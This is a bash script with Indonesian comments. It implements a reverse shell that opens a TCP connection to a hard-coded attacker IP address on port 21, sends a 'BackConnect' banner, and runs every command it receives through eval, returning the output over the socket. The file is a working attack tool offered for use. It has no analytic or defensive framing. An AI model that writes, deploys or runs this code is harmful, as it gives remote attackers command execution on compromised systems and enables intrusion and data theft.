#!/bin/bash

RHOST="165.101.18.61"   # ganti IP attacker
RPORT=21            # ganti port listener

# Buka koneksi TCP
exec 5<>/dev/tcp/$RHOST/$RPORT

# Kirim banner ke attacker
echo "=============================" >&5
echo "   Connected to BackConnect  " >&5
echo "   Bash Reverse Shell Active " >&5
echo "=============================" >&5
echo "" >&5

# Redirect stdin, stdout, stderr ke socket
while IFS= read -r line <&5; do
  eval "$line" 2>&5 >&5
done
